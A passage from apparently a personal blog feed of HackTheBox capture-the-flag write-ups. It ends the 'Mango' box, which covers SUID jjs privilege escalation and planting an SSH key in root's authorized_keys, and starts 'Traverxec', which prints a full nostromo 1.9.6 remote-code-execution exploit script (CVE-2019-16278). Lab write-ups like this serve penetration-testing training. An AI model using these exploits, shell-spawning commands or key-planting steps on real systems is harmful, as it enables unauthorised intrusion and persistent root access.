JCPU   PCPU WHAT</span><br><span class="line">mango    pts/<span class="number">0</span>    <span class="number">10.10</span><span class="number">.15</span><span class="number">.230</span>     <span class="number">22</span>:<span class="number">39</span>    <span class="number">2.00</span>s  <span class="number">2.52</span>s  <span class="number">0.01</span>s sshd: mango [priv]</span><br></pre></td></tr></table></figure><p>Going deep of the recon I see interesting stuffs which is the <code>JJS</code> installed.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">[<span class="meta">+</span>] Possibly interesting SUID files:</span><br><span class="line">-rwsr-sr-- <span class="number">1</span> root admin <span class="number">10352</span> Jul <span class="number">18</span>  <span class="number">2019</span> /usr/lib/jvm/java<span class="number">-11</span>-openjdk-amd64/bin/jjs</span><br></pre></td></tr></table></figure><p>As you can see <code>jjs</code> is owned also by <code>root</code>, after the script is finish running. I also checked the other <em>SUID</em> :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">admin@mango:/home/mango$ find / -perm -4000 -user root 2&gt;/dev/null</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping</span><br><span class="line">/snap/core/7713/bin/mount</span><br><span class="line">/snap/core/7713/bin/ping</span><br><span class="line">/snap/core/7713/bin/ping6</span><br><span class="line">/snap/core/7713/bin/su</span><br><span class="line">/snap/core/7713/bin/umount</span><br><span class="line">/snap/core/7713/usr/bin/chfn</span><br><span class="line">/snap/core/7713/usr/bin/chsh</span><br><span class="line">/snap/core/7713/usr/bin/gpasswd</span><br><span class="line">/snap/core/7713/usr/bin/newgrp</span><br><span class="line">/snap/core/7713/usr/bin/passwd</span><br><span class="line">/snap/core/7713/usr/bin/sudo</span><br><span class="line">/snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core/7713/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core/7713/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core/7713/usr/sbin/pppd</span><br><span class="line">/snap/core/6350/bin/mount</span><br><span class="line">/snap/core/6350/bin/ping</span><br><span class="line">/snap/core/6350/bin/ping6</span><br><span class="line">/snap/core/6350/bin/su</span><br><span class="line">/snap/core/6350/bin/umount</span><br><span class="line">/snap/core/6350/usr/bin/chfn</span><br><span class="line">/snap/core/6350/usr/bin/chsh</span><br><span class="line">/snap/core/6350/usr/bin/gpasswd</span><br><span class="line">/snap/core/6350/usr/bin/newgrp</span><br><span class="line">/snap/core/6350/usr/bin/passwd</span><br><span class="line">/snap/core/6350/usr/bin/sudo</span><br><span class="line">/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core/6350/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core/6350/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core/6350/usr/sbin/pppd</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/run-mailcap</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">admin@mango:/home/mango$</span><br></pre></td></tr></table></figure><h3 id="Get-the-root-txt"><a href="#Get-the-root-txt" class="headerlink" title="Get the root.txt"></a>Get the root.txt</h3><p>I get a hint from the forum, the privilege escalation part is <a href="gtfobins/jjs/">#GTFObins</a> so I go the website and checked about <code>JJS</code> :</p><p><img src="/img/mango/shell.PNG" alt="HackTheBox-Sniper" title="JJS"></p><p>According to <code>#GTFObins</code>, we are able to spawn an interactive shell with elevated permissions, I used <code>File read</code> to catch <code>root.txt</code> at <code>/root/</code> directory and yes ! I‚Äôm allowed to read that.</p><p><img src="/img/mango/file-read.PNG" alt="HackTheBox-Sniper" title="JJS"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># java</span><br><span class="line"></span><br><span class="line">admin<span class="meta">@mango</span>:/home/admin$ jjs</span><br><span class="line">Warning: The jjs tool is planned to be removed from a future JDK release</span><br><span class="line">jjs&gt; <span class="keyword">var</span> BufferedReader = Java.type(<span class="string">"java.io.BufferedReader"</span>); <span class="keyword">var</span> FileReader = Java.type(<span class="string">"java.io.FileReader"</span>); <span class="keyword">var</span> br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="string">"/root/root.txt"</span>)); <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123; print(line); &#125;</span><br><span class="line"><span class="number">8</span>a8ef[---------------------]<span class="number">9</span>ab15</span><br><span class="line">jjs&gt; exit()</span><br><span class="line">admin<span class="meta">@mango</span>:/home/admin$</span><br></pre></td></tr></table></figure><p>I also try the <code>SUID</code> when I execute it my session terminal shell is hang up but I get the administrator shell.</p><p><img src="/img/mango/suid.PNG" alt="HackTheBox-Sniper" title="JJS"></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"># java</span><br><span class="line"></span><br><span class="line">admin<span class="meta">@mango</span>:/home/mango$ echo <span class="string">"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\$&#123;IFS&#125;-p _ echo sh -p &lt;$(tty) &gt;$(tty) 2&gt;$(tty)').waitFor()"</span> | jjs</span><br><span class="line">Warning: The jjs tool is planned to be removed from a future JDK release</span><br><span class="line">jjs&gt; Java.type(<span class="string">'java.lang.Runtime'</span>).getRuntime().exec(<span class="string">'/bin/sh -pc $@|sh$&#123;IFS&#125;-p _ echo sh -p &lt;/dev/pts/1 &gt;/dev/pts/1 2&gt;/dev/pts/1'</span>).waitFor()</span><br><span class="line">#</span><br></pre></td></tr></table></figure><h3 id="Administrator-Shell"><a href="#Administrator-Shell" class="headerlink" title="Administrator Shell"></a>Administrator Shell</h3><p>I am not satisfy what I did because I want to catch the admin shell and get again the <code>root.txt</code> I have only one options remaining the <code>File write</code> functions.</p><p><img src="/img/mango/file-write.PNG" alt="HackTheBox-Sniper" title="JJS"></p><p>So my idea is to inject <code>SSH key</code> to <code>/root/.ssh/</code> directory and login as root with my <code>rsa keys</code> so first i will generate my <code>SSH Keys</code> with commad <code>&#39;ssh-key -t rsa&#39;</code> then copy the <code>id_rsa.pub</code> and echo it into a file in the <code>/tmp</code> directory so :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">admin@mango:/home/mango$ <span class="built_in">echo</span> <span class="string">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrIFVL39sxNcAJY5yNM2XxpZtDIeZXI3/HrPW465dJPzS8QqnytUf8pYR2cg9tk3E5CV4XjaYn3MxwDuQ3b5NWjvnqS/8KOCyM1FKQAON/zE055LmxUsv4XysN6bD5HK/wtykAdHCOTvnN2PSQjUMCLe7RDep4Y37KvJdiyN1BnoccHqFo+7BV2PnuBk5rs5o1cG13Knex5hTQhbgXvARqy8nGLeJGjrryl2xsKdyBYeKzBsLLKIEj12LVWBk4zkedDLdcSBMMaioowjB53b+m0/Rel0DT35MLxK1evJL5O2QSQE4qicRKt+verPogttcwq8zWn21orFasRN65kjWM8LKzdgqt8XpGEZ6L/ATZr4rhgu2eduGOuWwMWob6MttdT7X4qAZsfrMdTKuVdJa217dq4U72CJ3a6Re0CQrRxS7eoQHWcYvYIewWbHq/ro+xsyTR7gMDmW82UoE0TZV3/b9WXWgjdQvnVVQ8rxJHVegZAUCFq8LwwBq/Alh6gys= root@Payas0"</span> &gt; /tmp/ssh</span><br></pre></td></tr></table></figure><p>And now overwrite the root‚Äôs <code>authorized_keys</code> file :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">admin@mango:/home/mango$ <span class="built_in">echo</span> <span class="string">"Java.type('java.lang.Runtime').getRuntime().exec('cp /tmp/ssh /root/.ssh/authorized_keys').waitFor()"</span> | jjs</span><br><span class="line">Warning: The jjs tool is planned to be removed from a future JDK release</span><br><span class="line">jjs&gt; Java.type(<span class="string">'java.lang.Runtime'</span>).getRuntime().<span class="built_in">exec</span>(<span class="string">'cp /tmp/ssh /root/.ssh/authorized_keys'</span>).waitFor()</span><br><span class="line">0</span><br><span class="line">jjs&gt;</span><br><span class="line">admin@mango:/home/mango$</span><br></pre></td></tr></table></figure><p>Now that I setup all‚Äô I‚Äôll login as a root and finally have the last shell and also catch again the <code>root.txt</code> :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Mango via üêç v2.7.17 </span><br><span class="line">‚ùØ ssh -i /root/.ssh/id_rsa root@10.10.10.162</span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Sat Apr 18 23:40:32 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.04               Processes:            114</span><br><span class="line">  Usage of /:   25.8% of 19.56GB   Users logged <span class="keyword">in</span>:      1</span><br><span class="line">  Memory usage: 11%                IP address <span class="keyword">for</span> ens33: 10.10.10.162</span><br><span class="line">  Swap usage:   4%</span><br><span class="line"></span><br><span class="line"> * Kata Containers are now fully integrated <span class="keyword">in</span> Charmed Kubernetes 1.16!</span><br><span class="line">   Yes, charms take the Krazy out of K8s Kata Kluster Konstruction.</span><br><span class="line"></span><br><span class="line">     https://ubuntu.com/kubernetes/docs/release-notes</span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">122 packages can be updated.</span><br><span class="line">18 updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sat Apr 18 23:25:35 2020 from 10.10.14.43</span><br><span class="line">root@mango:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@mango:~<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@mango:~<span class="comment"># cat root.txt</span></span><br><span class="line">8a8ef[---------------------]9ab15</span><br><span class="line">root@mango:~<span class="comment">#</span></span><br></pre></td></tr></table></figure><hr><p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p><p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p><hr><p>Referrences:</p><p><a href="https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/" target="_blank" rel="noopener">Extracting MongoDB password with NoSQL Injection</a></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" target="_blank" rel="noopener">NoSQL Injection</a></p><p><a href="https://cornerpirate.com/2018/08/17/java-gives-a-shell-for-everything/" target="_blank" rel="noopener">Java gives a shell for everthing</a></p><p><a href="https://gtfobins.github.io/gtfobins/jjs/" target="_blank" rel="noopener">#GTFObins - JJS</a></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
          <category> PenTesting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GTFObins </tag>
            
            <tag> linux </tag>
            
            <tag> retired </tag>
            
            <tag> MongoDB </tag>
            
            <tag> NoSQL </tag>
            
            <tag> jjs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Traverxec</title>
      <link href="/2020-04-11/HackTheBox-Traverxec/"/>
      <url>/2020-04-11/HackTheBox-Traverxec/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/traverxec/traverxec1.png" alt="HackTheBox-Traverxec" title="Traverxec machine details"></p><hr><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   ‚Üí Traverxec is another beginner friendly machine that runs on Linux. The machine has two open ports which is port <code>22</code> &amp; <code>80</code> that basically running a <code>SSH</code> and <code>HTTP Service</code>.  There is nothing to use on the website when I tried to look something but the website‚Äôs has middleware service <code>Nostromo 1.9.6</code> has a directory traversal bypass that causes <code>RCE</code> or <a href="https://www.netsparker.com/blog/web-security/remote-code-evaluation-execution/" target="_blank" rel="noopener">Remote Code Execution</a> and enter into <code>www-data</code>.<br>   After entering the target machine it seems that user directory give us <code>Permission&#39;s denied</code> but when I was look at the <code>configuration file</code> we can enter at <code>/public_www/</code> based on the <code>$HOMEDIRS</code>. The directory contains <code>SSH Key</code> which I use to enter for user <code>david</code>.<br>   The Privilege Escalation part was tricky. As the user has can run <em><code>journalctl</code></em> that has root privileges and to get the root is to change the size of our terminal shell into small so I can execute <code>!/bin/bash</code> command and get the administrator shell.</p><hr><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>‚Üí Nmap scan</p><p>‚Üí discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>‚Üí Browsing the HTTP Service</p><p>‚Üí Search about <code>Nostromo 1.9.6</code></p></li><li><p><strong>Post - Exploitation</strong></p><p>‚Üí Enumerate machine with <code>Nostromo 1.9.6 Exploit</code></p><p>‚Üí Metasploit to gain direct access</p><p>‚Üí run <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a> or <code>Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</code> to look for interesting inside the machine</p><p>‚Üí Decrypt the password hash that appear on the script.</p><p>‚Üí Looking at <code>configuration file</code> we allowed to enter <code>/public_www/</code></p></li><li><p><strong>Exploitation</strong></p><p>‚Üí copy the <code>backup-ssh-key</code> at the <code>/tmp/</code> directory</p><p>‚Üí enumerate <code>david</code> files we see <code>SSH Key</code></p><p>‚Üí decrypt <code>SSH Key</code> with <a href="https://github.com/koboi137/john/blob/bionic/ssh2john.py" target="_blank" rel="noopener">ssh2john</a> and decrypt the hash with <a href="https://github.com/koboi137/john" target="_blank" rel="noopener">John</a></p><p>‚Üí Login with <code>SSH Key</code> and use the passphrase we decrypt and get the <code>user.txt</code></p></li><li><p><strong>Privilege Escalation</strong></p><p>‚Üí Abuse what the <code>user</code> is allowed to run which is the <code>journalctl</code></p><p>‚Üí with <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFObins</a> I see that i can execute a shell with <code>journalctl</code></p><p>‚Üí change the terminal into small size and execute <code>!/bin/bash</code> and become <code>root</code></p><p>‚Üí Finally get the <code>root.txt</code></p></li></ol><hr><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>‚Üí I always begin at <strong><em>NMAP</em></strong> to look on the services what is running. I always use</p><hr><ul><li>-sV      ‚áí Probe open ports to determine service/version info</li><li>-sC      ‚áí equivalent to ‚Äîscript=default</li><li>-T 0-5   ‚áí Set timing template - higher is faster (less accurate)</li><li>-A-      ‚áí Agressive scan</li><li>-oN      ‚áí to save our scan results to a text file</li></ul><hr><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">nmap -sV -sC -A -T4 <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span> -oN nmap-Traverxec</span><br></pre></td></tr></table></figure><hr><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec </span><br><span class="line">‚ùØ nmap -sV -sC -A -T4 <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span> -oN nmap-Traverxec</span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-04-11 05:53 PST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span></span><br><span class="line"><span class="function">Host <span class="keyword">is</span> <span class="title">up</span> (<span class="params"><span class="number">0.26</span>s latency</span>).</span></span><br><span class="line"><span class="function">Not shown: 998 filtered ports</span></span><br><span class="line"><span class="function">PORT   STATE SERVICE VERSION</span></span><br><span class="line"><span class="function">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+<span class="title">deb10u1</span> (<span class="params">protocol <span class="number">2.0</span></span>)</span></span><br><span class="line"><span class="function">| ssh-hostkey: </span></span><br><span class="line"><span class="function">|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:<span class="title">cc</span> (<span class="params">ECDSA</span>)</span></span><br><span class="line"><span class="function">|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:<span class="title">ce</span> (<span class="params">ED25519</span>)</span></span><br><span class="line"><span class="function">80/tcp open  http    nostromo 1.9.6</span></span><br><span class="line"><span class="function">|_http-server-header: nostromo 1.9.6</span></span><br><span class="line"><span class="function">|_http-title: TRAVERXEC</span></span><br><span class="line"><span class="function">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span></span><br><span class="line"><span class="function">Aggressive OS guesses: Linux 3.10 - 4.11 (<span class="params"><span class="number">92</span>%</span>), Linux 3.18 (<span class="params"><span class="number">92</span>%</span>), Linux 3.2 - 4.9 (<span class="params"><span class="number">92</span>%</span>), Crestron XPanel control <span class="title">system</span> (<span class="params"><span class="number">90</span>%</span>), Linux 3.16 (<span class="params"><span class="number">89</span>%</span>), ASUS RT-N56U <span class="title">WAP</span> (<span class="params">Linux <span class="number">3.4</span></span>) (<span class="params"><span class="number">87</span>%</span>), Linux 3.1 (<span class="params"><span class="number">87</span>%</span>), Linux 3.2 (<span class="params"><span class="number">87</span>%</span>), HP P2000 G3 NAS <span class="title">device</span> (<span class="params"><span class="number">87</span>%</span>), AXIS 210A or 211 Network <span class="title">Camera</span> (<span class="params">Linux <span class="number">2.6</span><span class="number">.17</span></span>) (<span class="params"><span class="number">87</span>%</span>)</span></span><br><span class="line"><span class="function">No exact OS matches <span class="keyword">for</span> <span class="title">host</span> (<span class="params">test conditions non-ideal</span>).</span></span><br><span class="line"><span class="function">Network Distance: 2 hops</span></span><br><span class="line"><span class="function">Service Info: OS: Linux</span>; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (<span class="keyword">using</span> port <span class="number">22</span>/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">258.62</span> ms <span class="number">10.10</span><span class="number">.14</span><span class="number">.1</span></span><br><span class="line"><span class="number">2</span>   <span class="number">264.54</span> ms <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap done: <span class="number">1</span> <span class="function">IP <span class="title">address</span> (<span class="params"><span class="number">1</span> host up</span>) scanned <span class="keyword">in</span> 37.77 seconds</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">root <span class="keyword">in</span> htb/boxes/Traverxec took 38s </span></span><br><span class="line"><span class="function">‚ùØ</span></span><br></pre></td></tr></table></figure><hr><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>So there‚Äôs port open.</p><ul><li>22      ‚áí which basically use for SSH Connections</li><li>80       ‚áí which basically running a website also there‚Äôs running a service which is <code>Nostromo</code> at version <code>1.9.6</code></li></ul><hr><hr><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Traverxec-Website"><a href="#Traverxec-Website" class="headerlink" title="Traverxec Website"></a>Traverxec Website</h3><p>Since there‚Äôs Web Service running, I will look at it and try what should I got so:</p><p><img src="/img/traverxec/traverxec-david.png" alt="HackTheBox-Traverxec" title="Traverxec machine details"></p><p>So we have a hint from the front page of the website. I got a user named ‚Äì <code>David White</code> i will take note this because there‚Äôs a possibly that guy we will be our user.</p><p>also the website‚Äôs a has a contact form but not much interesting.</p><p><img src="/img/traverxec/traverxec-contact-form.png" alt="HackTheBox-Traverxec" title="Traverxec machine details"></p><p>other than there‚Äôs no more stuffs on the web‚Äô so I‚Äôll gonna move on the next phase.</p><p>In my nmap scan results‚Äô the <code>HTTP Service</code> has running <code>Nostromo 1.9.6</code> i try to use <a href="https://github.com/offensive-security/exploitdb/blob/master/searchsploit" target="_blank" rel="noopener">searchsploit</a> to look if there‚Äôs a vulnerability in that service and yes it has.</p><h3 id="Nostromo-1-9-6"><a href="#Nostromo-1-9-6" class="headerlink" title="Nostromo 1.9.6"></a>Nostromo 1.9.6</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec </span><br><span class="line">‚ùØ searchsploit nostromo</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                    |  Path</span><br><span class="line">                                                                                                                                                  | (/usr/share/exploitdb/)</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Nostromo - <span class="function">Directory Traversal Remote Command <span class="title">Execution</span> (<span class="params">Metasploit</span>)                                                                              | exploits/multiple/remote/47573.rb</span></span><br><span class="line"><span class="function">nostromo 1.9.6 - Remote Code Execution                                                                                                            | exploits/multiple/remote/47837.py</span></span><br><span class="line"><span class="function">nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                                                                              | exploits/linux/remote/35466.sh</span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span></span><br><span class="line"><span class="function">Shellcodes: No Result</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">root <span class="keyword">in</span> htb/boxes/Traverxec </span></span><br><span class="line"><span class="function">‚ùØ</span></span><br></pre></td></tr></table></figure><p>It was a directory traversal attack which is lead to <code>Remote Command Execution</code>. I try to look on the exploit with searchsploit again with <code>-x</code></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec </span><br><span class="line">‚ùØ searchsploit -x nostromo <span class="number">1.9</span><span class="number">.6</span> - Remote Code Execution                                                                                                            | exploits/multiple/remote/<span class="number">47837.</span>py</span><br></pre></td></tr></table></figure><p>and the code exploit:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: nostromo 1.9.6 - Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 2019-12-31</span></span><br><span class="line"><span class="comment"># Exploit Author: Kr0ff</span></span><br><span class="line"><span class="comment"># Vendor Homepage:</span></span><br><span class="line"><span class="comment"># Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz</span></span><br><span class="line"><span class="comment"># Version: 1.9.6</span></span><br><span class="line"><span class="comment"># Tested on: Debian</span></span><br><span class="line"><span class="comment"># CVE : CVE-2019-16278</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cve2019_16278.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">art = <span class="string">"""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                        _____-2019-16278</span></span><br><span class="line"><span class="string">        _____  _______    ______   _____\    \   </span></span><br><span class="line"><span class="string">   _____\    \_\      |  |      | /    / |    |  </span></span><br><span class="line"><span class="string">  /     /|     ||     /  /     /|/    /  /___/|  </span></span><br><span class="line"><span class="string"> /     / /____/||\    \  \    |/|    |__ |___|/  </span></span><br><span class="line"><span class="string">|     | |____|/ \ \    \ |    | |       \        </span></span><br><span class="line"><span class="string">|     |  _____   \|     \|    | |     __/ __     </span></span><br><span class="line"><span class="string">|\     \|\    \   |\         /| |\    \  /  \    </span></span><br><span class="line"><span class="string">| \_____\|    |   | \_______/ | | \____\/    |   </span></span><br><span class="line"><span class="string">| |     /____/|    \ |     | /  | |    |____/|   </span></span><br><span class="line"><span class="string"> \|_____|    ||     \|_____|/    \|____|   | |   </span></span><br><span class="line"><span class="string">        |____|/                        |___|/    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">help_menu = <span class="string">'\r\nUsage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">(soc)</span>:</span></span><br><span class="line">    response = <span class="string">""</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            connection = soc.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> len(connection) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            response += connection</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cve</span><span class="params">(target, port, cmd)</span>:</span></span><br><span class="line">    soc = socket.socket()</span><br><span class="line">    soc.connect((target, int(port)))</span><br><span class="line">    payload = <span class="string">'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n&#123;&#125; 2&gt;&amp;1'</span>.format(cmd)</span><br><span class="line">    soc.send(payload)</span><br><span class="line">    receive = connect(soc)</span><br><span class="line">    print(receive)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    print(art)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">        cmd = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">        cve(target, port, cmd)</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        print(help_menu)</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="Enumerate-Traverxec-machine"><a href="#Enumerate-Traverxec-machine" class="headerlink" title="Enumerate Traverxec machine"></a>Enumerate Traverxec machine</h3><p>I search about the <code>Nostromo 1.9.6</code> vulnerabilities, using the exploit that I have, i can execute a command like <code>whoami</code> and <code>hostname</code> so:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Traverxec via üêç v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">‚ùØ python cve2019_16278.py <span class="number">10.10</span><span class="number">.10</span><span class="number">.165</span> <span class="number">80</span> whoami</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                        _____<span class="number">-2019</span><span class="number">-16278</span></span><br><span class="line">        _____  _______    ______   _____\    \   </span><br><span class="line">   _____\    \_\      |  |      | /    / |    |  </span><br><span class="line">  /     /|     ||     /  /     /|/    /  /___/|  </span><br><span class="line"> /     / /____/||\    \  \    |/|    |__ |___|/  </span><br><span class="line">|     | |____|/ \ \    \ |    | |       \        </span><br><span class="line">|     |  _____   \|     \|    | |     __/ __     </span><br><span class="line">|\     \|\    \   |\         /| |\    \  /  \    </span><br><span class="line">| \_____\|    |   | \_______/ | | \____\/    |   </span><br><span class="line">| |     /____/|    \ |     | /  | |    |____/|   </span><br><span class="line"> \|_____|    ||     \|_____|/    \|____|   | |   </span><br><span class="line">        |____|/                        |___|/    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span 